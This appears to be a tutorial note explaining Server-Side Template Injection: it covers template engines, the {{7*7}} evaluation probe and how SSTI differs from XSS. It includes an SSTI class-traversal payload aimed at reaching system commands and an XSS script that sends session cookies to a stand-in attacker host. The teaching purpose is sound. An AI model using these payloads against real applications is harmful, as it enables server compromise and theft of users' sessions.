
When the user input is not sanitized properly , the attacker can inject the malcious payload , for example 

<h1>Hello {{ username }}</h1>


when the user type the malcious payload in the input field , attacker can take the control the system depend upon the type of the payload 

# What is template in the SSTI ?

In the context of a **Server-Side Template Injection (SSTI)** attack, a **template** refers to a document that combines static content with placeholders for dynamic data. It is used by a **template engine** to generate a final web page or email.

Here's a breakdown of the key concepts:

- **Template Engine**: A software component used in web applications to generate dynamic HTML responses. Instead of building every web page from scratch with hard-coded values, developers create templates with placeholders, which are then filled with actual data at runtime. Popular template engines include **Jinja2** (Python), **Twig** (PHP), and **FreeMarker** (Java).
    
- **Placeholders**: These are special syntax elements within a template that act as variables or expressions. When the template engine processes the template, it replaces these placeholders with data from the server or user input. For example, a template might contain a placeholder like `{{username}}`, which the engine replaces with the user's actual name, like "John Doe."


### Non-SSTI Page

On a standard, secure web page, the server's backend code and the browser's rendering process are designed to prevent the input from being executed.

- **Processing:** The server receives the string `{{7*7}}` and simply includes it in the HTML response.
    
- **Result:** The browser receives HTML code that looks like `<body><p>Your input was: {{7*7}}</p></body>`. The browser doesn't know what `{{...}}` means; it just renders the characters literally on the page.
    
- **Safety:** This is the correct and secure behavior. It prevents attackers from using special characters to execute code on the server or the user's browser (a different vulnerability called Cross-Site Scripting, or XSS).
    

---

### SSTI Page

An SSTI-vulnerable page incorrectly allows user input to be passed to a **template engine**. This engine, designed to process dynamic content and variables, sees `{{7*7}}` not as a string but as a command to be evaluated.

- **Processing:** The server receives the string `{{7*7}}`. A programming error causes this input to be fed directly into a template, where the template engine evaluates it.
    
- **Result:** The engine calculates `7*7` to be `49`, then generates the final HTML output. The browser receives `<body><p>Your result is: 49</p></body>`.
    
- **Danger:** This behavior is a critical security flaw. An attacker can use this to execute arbitrary code on the server by crafting more complex payloads, not just simple math. For example, they could try to access sensitive server files or run system commands, potentially taking full control of the server.


## Differentiating XSS and SSTI

- ### 1. Server-Side Template Injection (SSTI)

SSTI is a critical vulnerability that occurs when an attacker can inject a malicious payload into a template, and the **server-side template engine** (like Jinja2, Twig, or Freemarker) processes and executes it.

- **Goal:** To compromise the server.
    
- **How it Works:** The payload is executed by the server's runtime environment (e.g., Python, Java, PHP) during the process of generating the final HTML page.
    
- **Example Payload:** `{{'a'.__class__.__base__.__subclasses__()}}` (attempts to find a way to run system commands on the server).
    
- **Analogy:** It's like sending a word document with an embedded macro that runs when the server opens and processes the file, giving the attacker control over the application's computer.
    

---

### 2. Cross-Site Scripting (XSS)

XSS is a common vulnerability that occurs when a web application takes untrusted input and includes it in the final HTML page **without proper sanitization**. The execution happens after the page is loaded by the victim.

- **Goal:** To compromise a user's session or browser.
    
- **How it Works:** The attacker injects JavaScript code. When a victim loads the compromised web page, their browser interprets the injected input as legitimate code and executes the script, which runs under the user's authority.
    
- **Example Payload:** `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>` (attempts to steal the user's session cookie).
    
- **Analogy:** It's like leaving a malicious script on a public bulletin board; anyone who views the board (the webpage) has the script run on their personal computer (their browser).
